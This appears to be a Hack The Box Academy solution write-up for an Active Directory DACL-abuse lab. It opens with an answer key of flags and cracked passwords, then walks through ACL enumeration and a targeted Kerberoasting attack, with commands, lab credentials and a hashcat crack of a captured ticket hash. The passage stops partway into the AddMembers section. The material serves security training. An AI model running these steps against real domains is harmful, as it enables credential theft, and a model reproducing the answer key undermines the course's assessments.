| Section                       | Question Number | Answer                                                      |
| ----------------------------- | --------------- | ----------------------------------------------------------- |
| DACLs Overview                | Question 1      | WRITE PROPERTY                                              |
| DACLs Overview                | Question 2      | ContainerInherit                                            |
| DACLs Overview                | Question 3      | Service Principal Name                                      |
| DACLs Enumeration             | Question 1      | (RC, LC                                                     |
| DACLs Enumeration             | Question 2      | Owner                                                       |
| DACLs Enumeration             | Question 3      | User-Force-Change-Password                                  |
| DACLs Enumeration             | Question 4      | (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All |
| DACLs Enumeration             | Question 5      | (Self-Membership, Validated-SPN                             |
| Targeted Kerberoasting        | Question 1      | GenericWrite                                                |
| Targeted Kerberoasting        | Question 2      | GenericWrite                                                |
| Targeted Kerberoasting        | Question 3      | (ReadControl, WriteProperties, Self                         |
| Targeted Kerberoasting        | Question 4      | GenericAll                                                  |
| Targeted Kerberoasting        | Question 5      | FullControl                                                 |
| Targeted Kerberoasting        | Question 6      | Password2                                                   |
| AddMembers                    | Question 1      | AllExt3ndeDRigths\_AND\_MOr3                                |
| AddMembers                    | Question 2      | 4bU$1nG\_RIGths\_wIth\_DACLs                                |
| Password Abuse                | Question 1      | Yolanda\_Is\_GooD\_wIth\_Computers                          |
| Password Abuse                | Question 2      | L%EG/p5g5@\[F$s                                             |
| Password Abuse                | Question 3      | AllExtendedRights                                           |
| Password Abuse                | Question 4      | GMSA\_ACcounts\_DACL\_ABUSE                                 |
| Granting Rights and Ownership | Question 1      | WriteDACL\_4Bus3\_4\_Gr0UpS                                 |
| Granting Rights and Ownership | Question 2      | Wr1t3\_D4CL\_4\_US3rs                                       |
| Granting Rights and Ownership | Question 3      | Abus1nG\_OWNERS\_000s                                       |
| Granting Rights and Ownership | Question 4      | Getting\_Acc3ss\_T0\_Th3\_CEO\_Acc                          |
| Skills Assessment             | Question 1      | Mathew                                                      |
| Skills Assessment             | Question 2      | ilovejesus                                                  |
| Skills Assessment             | Question 3      | R3D1nLAPS\_Is\_F4N                                          |
| Skills Assessment             | Question 4      | fa61a89e878f8688afb10b515a4866c7                            |
| Skills Assessment             | Question 5      | DCSync\_2\_CompRoMIs3\_3V3rYTh1nG                           |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# DACLs Overview

## Question 1

### "Using dsacls.exe, enumerate the permissions that Pedro has over Sam and then submit the fourth permission as the answer. (The answer is case-sensitive.)"

After spawning the target machine, students need to connect to it with RDP utilizing the credentials `pedro:SecuringAD01`:

Code: shell

```shell
xfreerdp /v:STMIP /u:pedro /p:SecuringAD01 /dynamic-resolution
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-eoy6fvfc9v]─[~]
└──╼ [★]$ xfreerdp /v:10.129.6.141 /u:pedro /p:SecuringAD01 /dynamic-resolution

[16:28:20:154] [2615:2616] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[16:28:20:154] [2615:2616] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[16:28:20:155] [2615:2616] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[16:28:20:175] [2615:2616] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[16:28:20:175] [2615:2616] [WARN][com.freerdp.crypto] - CN = DC01.INLANEFREIGHT.LOCAL
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.6.141:3389) 
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - Common Name (CN):
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - 	DC01.INLANEFREIGHT.LOCAL
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.6.141:3389 (RDP-Server):
	Common Name: DC01.INLANEFREIGHT.LOCAL
	Subject:     CN = DC01.INLANEFREIGHT.LOCAL
	Issuer:      CN = DC01.INLANEFREIGHT.LOCAL
	Thumbprint:  50:77:68:3c:b5:e7:ae:2c:a6:0b:17:88:46:b6:7f:72:85:f8:7a:f2:52:dd:23:85:cf:c8:16:b1:1c:f8:17:c8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students need to run `PowerShell` and use `dsacls.exe` to enumerate the permissions that `Pedro` has over `Sam`, finding the fourth one to be `WRITE PROPERTY`:

Code: powershell

```powershell
dsacls.exe "cn=Sam,cn=users,dc=inlanefreight,dc=local" | Select-String "Pedro" -Context 0,3
```

```
PS C:\Users\pedro> dsacls.exe "cn=Sam,cn=users,dc=inlanefreight,dc=local" | Select-String "Pedro" -Context 0,3

> Allow INLANEFREIGHT\pedro             SPECIAL ACCESS
                                        READ PERMISSONS
                                        WRITE SELF
                                        WRITE PROPERTY
> Allow INLANEFREIGHT\pedro             SPECIAL ACCESS
                                        READ PERMISSONS
                                        WRITE SELF
                                        WRITE PROPERTY
```

Answer: `WRITE PROPERTY`

# DACLs Overview

## Question 2

### "Using PowerShell, enumerate the permission that Luna has over Sam and then submit the value of the member InheritanceFlags. (The answer is case-sensitive.)"

Using the same RDP session from the previous question, students need to use PowerShell to enumerate the permission that `Luna` has over `Sam` to find the value of the member `InheritanceFlags` to be `ContainerInherit`:

Code: powershell

```powershell
$directorySearcher = New-Object System.DirectoryServices.DirectorySearcher('(samaccountname=Sam)')
$directorySearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Owner
$binarySecurityDescriptor = $directorySearcher.FindOne().Properties.ntsecuritydescriptor[0]
$parsedSecurityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity
$parsedSecurityDescriptor.SetSecurityDescriptorBinaryForm($binarySecurityDescriptor)
$parsedSecurityDescriptor.Access | ? {$_.IdentityReference -like '*Luna*'}
```

```
PS C:\Users\pedro> $directorySearcher = New-Object System.DirectoryServices.DirectorySearcher('(samaccountname=Sam)')
PS C:\Users\pedro> $directorySearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Owner
PS C:\Users\pedro> $binarySecurityDescriptor = $directorySearcher.FindOne().Properties.ntsecuritydescriptor[0]
PS C:\Users\pedro> $parsedSecurityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity
PS C:\Users\pedro> $parsedSecurityDescriptor.SetSecurityDescriptorBinaryForm($binarySecurityDescriptor)
PS C:\Users\pedro> $parsedSecurityDescriptor.Access | ? {$_.IdentityReference -like '*Luna*'}

ActiveDirectoryRights : WriteDacl
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : INLANEFREIGHT\luna
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

Answer: `ContainerInherit`

# DACLs Overview

## Question 3

### "Using dsacls.exe, what is the attribute that Pedro can edit for the user Rita? (Submit the attribute's full name, not its acronym.)"

Using the same RDP session from the first question, students need to use `dsacls.exe` to enumerate the permission(s) that `Pedro` has over `Rita`, finding that `Pedro` can edit the `Service Principal Name` of `Rita`:

Code: powershell

```powershell
dsacls.exe "cn=Rita,cn=users,dc=inlanefreight,dc=local" | Select-String "Pedro" -Context 0,1
```

```
PS C:\Users\pedro> dsacls.exe "cn=Rita,cn=users,dc=inlanefreight,dc=local" | Select-String "Pedro" -Context 0,1

> Allow INLANEFREIGHT\pedro             SPECIAL ACCESS for Validated write to service principal name
                                        WRITE PROPERTY
> Allow INLANEFREIGHT\pedro             SPECIAL ACCESS for Validated write to service principal name
                                        WRITE PROPERTY
```

Answer: `Service Principal Name`

# DACLs Enumeration

## Question 1

### "What are the equivalent object-specific access rights bits for RIGHT\_GENERIC\_EXECUTE? (Separate them with a comma.)"

`RC` and `LC` are the equivalent `object-specific` `access rights bits` for `RIGHT_GENERIC_EXECUTE`:

![[HTB Solutions/CAPE/z. images/9700c5583decdc8ea41033597e8200ad_MD5.jpg]]

Answer: `RC, LC`

# DACLs Enumeration

## Question 2

### "RIGHT\_WRITE\_OWNER allows modifying what attribute of an object?"

`RIGHT_WRITE_OWNER` allows modifying the `owner` attribute of an object:

![[HTB Solutions/CAPE/z. images/9d0650f5082a6782332bb31ab3b76747_MD5.jpg]]

Answer: `owner`

# DACLs Enumeration

## Question 3

### "Provide the Common Name of the Extended Access Right with the GUID value "00299570-246d-11d0-a768-00aa006e0529"."

`User-Force-Change-Password` is the Common Name of the `extended access right` with the `GUID` value `00299570-246d-11d0-a768-00aa006e0529`:

![[HTB Solutions/CAPE/z. images/0bc864f8db6ea71b2acd74d813332e94_MD5.jpg]]

Answer: `User-Force-Change-Password`

# DACLs Enumeration

## Question 4

### "What are the Common Names of the two extended access rights required to perform a DCSync attack? (Separate them with a comma.)"

`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` are the common names of the two `extended access rights` required to perform a `DCSync` attack:

![[HTB Solutions/CAPE/z. images/ec35dd50339a40fcd4a7e6dad7fe7d8c_MD5.jpg]]

Answer: `DS-Replication-Get-Changes, DS-Replication-Get-Changes-All`

# DACLs Enumeration

## Question 5

### "What are the Common Names of the two abusable validated writes? (Separate them with a comma.)"

`Self-Membership` and `Validated-SPN` are the common names of the two abusable `validated writes`:

![[HTB Solutions/CAPE/z. images/78bf2e50235a68dfd8b3cc6c1667d3d5_MD5.jpg]]

Answer: `Self-Membership, Validated-SPN`

# Targeted Kerberoasting

## Question 1

### "Using PowerView, what is the ActiveDirectoryRights that Pedro has over sqladmin?"

After spawning the target machine, students need to connect to it with RDP utilizing the credentials `pedro:SecuringAD01`:

Code: shell

```shell
xfreerdp /v:STMIP /u:pedro /p:SecuringAD01 /dynamic-resolution
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-eoy6fvfc9v]─[~]
└──╼ [★]$ xfreerdp /v:10.129.6.141 /u:pedro /p:SecuringAD01 /dynamic-resolution

[16:28:20:154] [2615:2616] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[16:28:20:154] [2615:2616] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[16:28:20:155] [2615:2616] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[16:28:20:175] [2615:2616] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[16:28:20:175] [2615:2616] [WARN][com.freerdp.crypto] - CN = DC01.INLANEFREIGHT.LOCAL
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.6.141:3389) 
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - Common Name (CN):
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - 	DC01.INLANEFREIGHT.LOCAL
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.6.141:3389 (RDP-Server):
	Common Name: DC01.INLANEFREIGHT.LOCAL
	Subject:     CN = DC01.INLANEFREIGHT.LOCAL
	Issuer:      CN = DC01.INLANEFREIGHT.LOCAL
	Thumbprint:  50:77:68:3c:b5:e7:ae:2c:a6:0b:17:88:46:b6:7f:72:85:f8:7a:f2:52:dd:23:85:cf:c8:16:b1:1c:f8:17:c8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students need to run `PowerShell`, navigate to `C:\Tools\`, import `PowerView`, and use `Get-DomainObjectAcl` to fetch the permissions/`ACEs` that `pedro` has over `sqladmin`. Students will find that the `ActiveDirectoryRights` value of the only `ACE` that `pedro` has over `sqladmin` is `GenericWrite`:

Code: powershell

```powershell
Import-Module .\PowerView.ps1
$pedroSID = (Get-DomainUser -Identity pedro).ObjectSID
Get-DomainObjectAcl -Identity sqladmin | ? {$_.SecurityIdentifier -eq $pedroSID}
```

```
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $pedroSID = (Get-DomainUser -Identity pedro).ObjectSID
PS C:\Tools> Get-DomainObjectAcl -Identity sqladmin | ? {$_.SecurityIdentifier -eq $pedroSID}

ObjectDN              : CN=sqladmin,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             : S-1-5-21-1267651629-1192007096-1618970724-4623
ActiveDirectoryRights : GenericWrite
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 131112
SecurityIdentifier    : S-1-5-21-1267651629-1192007096-1618970724-4617
AceType               : AccessAllowed
AceFlags              : ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
AuditFlags            : None
```

Answer: `GenericWrite`

# Targeted Kerberoasting

## Question 2

### "Using BloodHound, what is the name of the edge between Pedro and SQLAdmin?"

Using the same RDP and `PowerShell` sessions from the previous question, students first need to run the C# data collector `SharpHound.exe` for `BloodHound`:

Code: powershell

```powershell
.\SharpHound.exe
```

```
PS C:\Tools> .\SharpHound.exe

2023-06-12T07:18:13.7750393-05:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2023-06-12T07:18:13.9629146-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-06-12T07:18:14.0094069-05:00|INFORMATION|Initializing SharpHound at 7:18 AM on 6/12/2023
2023-06-12T07:18:14.1344122-05:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for INLANEFREIGHT.LOCAL : DC01.INLANEFREIGHT.LOCAL
2023-06-12T07:18:14.2906628-05:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-06-12T07:18:14.4937881-05:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2023-06-12T07:18:44.5875664-05:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 40 MB RAM
2023-06-12T07:19:03.4156660-05:00|INFORMATION|Producer has finished, closing LDAP channel
2023-06-12T07:19:03.4156660-05:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-06-12T07:19:06.4171818-05:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2023-06-12T07:19:06.4625401-05:00|INFORMATION|Output channel closed, waiting for output task to complete
2023-06-12T07:19:06.5562938-05:00|INFORMATION|Status: 3651 objects finished (+3651 70.21154)/s -- Using 75 MB RAM
2023-06-12T07:19:06.5562938-05:00|INFORMATION|Enumeration finished in 00:00:52.0795563
2023-06-12T07:19:06.9469290-05:00|INFORMATION|Saving cache with stats: 3611 ID to type mappings.
 3611 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-06-12T07:19:06.9781661-05:00|INFORMATION|SharpHound Enumeration Completed at 7:19 AM on 6/12/2023! Happy Graphing!
```

Subsequently, students need to open `BloodHound` and log in to `Neo4j Database` utilzing the credentials `neo4j:Password123` and then upload the ZIP file created by `SharpHound`:

Code: powershell

```powershell
.\BloodHound\BloodHound.exe
```

```
PS C:\Tools> .\BloodHound\BloodHound.exe
PS C:\Tools>
(node:1396) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information
(node:7392) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
```

Once the data has been uploaded, students need to use the `Pathfinding` feature of `BloodHound` on `PEDRO@INLANEFREIGHT.LOCAL` and `SQLADMIN@INLANEFREIGHT.LOCAL` to find out that the name of the edge between them is `GenericWrite`:

![[HTB Solutions/CAPE/z. images/8630126528cbcd34cb45bf1303566d4f_MD5.jpg]]

Answer: `GenericWrite`

# Targeted Kerberoasting

## Question 3

### "Using dacledit.py, what are the names of the Access Mask that Pedro has over the account SQLAdmin? (Separate them by a comma, and don't include the numbers.)"

Students first need to clone the [ShutdownRepo impacket](https://github.com/ShutdownRepo/impacket) fork, create a Python virtual environment for it, and then install it:

Code: shell

```shell
git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket/
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~]
└──╼ [★]$ git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket/
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .

Cloning into 'impacket'...
remote: Enumerating objects: 22819, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (6/6), done.
<SNIP>
```

Subsequently, students need to use `dacledit.py` to enumerate the `ACEs` for `pedro` over `sqladmin`, finding the `access mask` holding `ReadControl`, `WriteProperties` and `Self`:

Code: shell

```shell
python3 examples/dacledit.py -principal pedro -target sqladmin -dc-ip STMIP inlanefreight.local/pedro:SecuringAD01
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal pedro -target sqladmin -dc-ip 10.129.93.96 inlanefreight.local/pedro:SecuringAD01

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-4617)
[*]   ACE[21] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE
[*]     Access mask               : ReadControl, WriteProperties, Self (0x20028)
[*]     Trustee (SID)             : pedro (S-1-5-21-1267651629-1192007096-1618970724-4617)
```

Answer: `ReadControl, WriteProperties, Self`

# Targeted Kerberoasting

## Question 4

### "Using PowerView, identify the value of ActiveDirectoryRights that Pedro has over Moly?"

Using the same RDP and PowerShell sessions from the first question, students need to use `Get-DomainObjectAcl` to fetch the permissions/`ACEs` that `pedro` has over `Moly`. Students will find that the `ActiveDirectoryRights` value of the only `ACE` that `pedro` has over `Moly` is `GenericAll`:

Code: powershell

```powershell
$pedroSID = (Get-DomainUser -Identity pedro).ObjectSID
Get-DomainObjectAcl -Identity Moly | ? {$_.SecurityIdentifier -eq $pedroSID}
```

```
PS C:\Tools> $pedroSID = (Get-DomainUser -Identity pedro).ObjectSID
PS C:\Tools> Get-DomainObjectAcl -Identity Moly | ? {$_.SecurityIdentifier -eq $pedroSID}

ObjectDN              : CN=Moly,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             : S-1-5-21-1267651629-1192007096-1618970724-5605
ActiveDirectoryRights : GenericAll
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983551
SecurityIdentifier    : S-1-5-21-1267651629-1192007096-1618970724-4617
AceType               : AccessAllowed
AceFlags              : ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
AuditFlags            : None
```

Answer: `GenericAll`

# Targeted Kerberoasting

## Question 5

### "Using dacledit.py, what is the Access Mask that Pedro has over the account Moly? (Don't include the numbers, only the name.)"

Using the same `dacledit venv` from question 3, students need to use `dacledit.py` to enumerate the `ACEs` for `pedro` over `moly`, finding the `access mask` holding `FullControl`:

Code: shell

```shell
python3 examples/dacledit.py -principal pedro -target moly -dc-ip STMIP inlanefreight.local/pedro:SecuringAD01
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal pedro -target moly -dc-ip 10.129.93.96 inlanefreight.local/pedro:SecuringAD01

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-4617)
[*]   ACE[20] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : pedro (S-1-5-21-1267651629-1192007096-1618970724-4617)
```

Answer: `FullControl`

# Targeted Kerberoasting

## Question 6

### "Using Pedro's account, submit the password of Moly's account."

From the previous question, students already know that `Pedro` has `FullControl` over `Moly`; therefore, using the account of `Pedro`, they need to carry out a `targeted Kerberoasting` attack to retrieve `Moly`'s password's hash. First, students need to clone [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) and install its requirements:

Code: shell

```shell
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast/
python3 -m pip install -r requirements.txt
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket]
└──╼ [★]$ git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast/
python3 -m pip install -r requirements.txt

Cloning into 'targetedKerberoast'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (45/45), done.
remote: Compressing objects: 100% (38/38), done.
<SNIP>
```

Before running `targetedKerberoast.py`, students should sync the time of `Pwnbox`/`PMVPN` with that of the `DC` using `ntpdate` (if not already installed, students can install it using the command `sudo apt install ntpdate`):

Code: shell

```shell
sudo ntpdate STMIP
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket/targetedKerberoast]
└──╼ [★]$ sudo ntpdate 10.129.93.96

12 Jun 14:31:35 ntpdate[5620]: step time server 10.129.93.96 offset +18000.448435 sec
```

Subsequently, students need perform a `targeted Kerberoasting` attack against `Moly` utilizing the account `pedro`, saving the hash into a file with the `-o` option:

Code: shell

```shell
python3 targetedKerberoast.py --request-user moly -d inlanefreight.local -u pedro -p SecuringAD01 --dc-ip STMIP -o molysHash.txt
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket/targetedKerberoast]
└──╼ [★]$ python3 targetedKerberoast.py --request-user moly -d inlanefreight.local -u pedro -p SecuringAD01 --dc-ip 10.129.93.96 -o molysHash.txt

[*] Starting kerberoast attacks
[*] Attacking user (moly)
[+] Writing hash to file for (Moly)
```

At last, students need to crack the password's hash of `Moly` with `hashcat`, utilizing `hash-mode` `13100` (`Kerberos 5, etype 23, TGS-REP`); students will find that the her plaintext password is `Password2`:

Code: shell

```shell
hashcat -m 13100 -w 3 -O molysHash.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket/targetedKerberoast]
└──╼ [★]$ hashcat -m 13100 -w 3 -O molysHash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Host memory required for this attack: 134 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5tgs$23$*Moly$INLANEFREIGHT.LOCAL$inlanefreight.local/Moly*$9248b136df05b89049d8f43aab78df4d$06ed71009977aa23813a23993f1579ee04840ec4347f1e54d473ba5a9f119c059eb55e68e519a2ca5928d5793ff180008fa37e4aa2442ca2602753d30202a4589a15850f6837404e2352b68933cf02d017d3e820b23d3ba03f9de5cf99af901bcd23917315d9df6358ae81f35260ed2f3db5472dcdb2176668a73b903140652b83c9f76d20eae66008525eb8c9908837e923e00bac9df9793b7ed7f8fc0e016b49cb117c0fd9dddd56337549ca90c6a6bafd0ceb76f2e41e11c82ef9957566bd50053c67749bfd4fa6e7d71b5ae4c0a34ab5513c1dd7790afcce5294756ca2c475bd0ec5b4d9c6cac7c72f75e1ce43015babbda18c46cb5f3ba26f2cc945af93f6c5327b8ff355ee263fccf9ac640394ffd2f796a3fbe9bdd86baf9acf88a51410233eb517237f31a648a98503a297d9939254c84efec4f09c535070f5ad5b98f4b6d2f429ffc36b84a24154e54b7f3bca3d4b5059c97226c291554bbdf33a1788ae03b680bdd44f843fb78d45d92914a4f2a106a9f496c71e845dd1a5bd5e80e4022908d6323e5462775a702a115f3c83789039767d337384a52b5171cc9b797c6606dfc5b959823931cce0bf8c90fa196ee646cdc3a481884faa53f6619a97e24401831db26cf2acdab98b16c0e1398c622d974c26e85272e88b109c84f497a3d5518b9ec3a09e6483e131c3b27474319b64c0cda1f31f89f02357bad4fd564e81a9c429f55508b99b69b2d851cc76b027399692a15c5e0f4d359f1119674330ea628097a722a60d2a5d0cae8dd9e4996eb4d94d3d8405a4f9c1955a2c58829d3d1213293b405fcbf9f381ec6aec7f336a229dd4071c2d115d1c82f67a56ede68c65755ada4739b9b06684abb7dbb909dc401b329285e56982eae316add282d3c5e306e806427a53c3c9e64595f314c696245ccd1b219873578214bfc0d0b3890c9e55941c9a922f25a42b80d7a9c5db432aa5c070ab55ee83aafd7c26d70553749ae847db98540a874ce7e90f24b129e353f3ab62f1e9d2b905c4f12488e879a8cb2931dc1c0293bf52edf933286f2faeea5cbbdd5dc583214d85259b2e92f62b5d0c5c4513e6adebafcfaf6f1c79fc32732fe15f2336ab580d6593f7f069c75cc38bcbdb7bbf01c60e1ce5cd62e278c6fbc8f486119d14cb54f6ebc808b3fd5055be37bd4454d02af62088b6abad8552324a8de47baf508ae1444dbb7b5f3b7546edca65ed61bc8780cff33ceaee9dc197d47cf39276e0de20bf6a8b8e4a8c0de58f2aa324912fb2c155183dddf01eeb8097ebd78a4da43d235f9857f4ec03da1cf2a4db2063d9a61b4f0ff43450edf7ccde7468fba694b83be0eb02132f5df2c652b9bef95ddb262c9129581bae41268eba4b1d9dafa4c28134048b8f2003514435b191b20060c3dfd30942308be49137136745c7538aec71f676b1378a2494fb5f807c542e69c89c7cffbdb38c916a7e04e524cfe8727fc021a032a1eeb2024b2a880fea75b996550b47f944736c12e3aeeca768ae24dd90038462b61fd5:Password2
   
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*Moly$INLANEFREIGHT.LOCAL$inlanefreight...b61fd5
Time.Started.....: Mon Jun 12 14:42:16 2023 (0 secs)
Time.Estimated...: Mon Jun 12 14:42:16 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  2458.3 kH/s (51.39ms) @ Accel:512 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 131073/14344385 (0.91%)
Rejected.........: 1/131073 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#2....: 123456 -> koryna
```

Answer: `Password2`

# AddMembers

## Question 1

### "Identify the access right that Pedro has over the group TestGroup and then abuse it to read the contents of the flag at \\\\DC01\\TestGroup\\flag.txt"

After spawning the target machine, students first need to clone the [ShutdownRepo impacket](https://github.com/ShutdownRepo/impacket) fork, create a Python virtual environment for it, and then install it:

Code: shell

```shell
git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket/
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~]
└──╼ [★]$ git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket/
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .

Cloning into 'impacket'...
remote: Enumerating objects: 22819, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 22819 (delta 6), reused 11 (delta 6), pack-reused 22807
<SNIP>
```

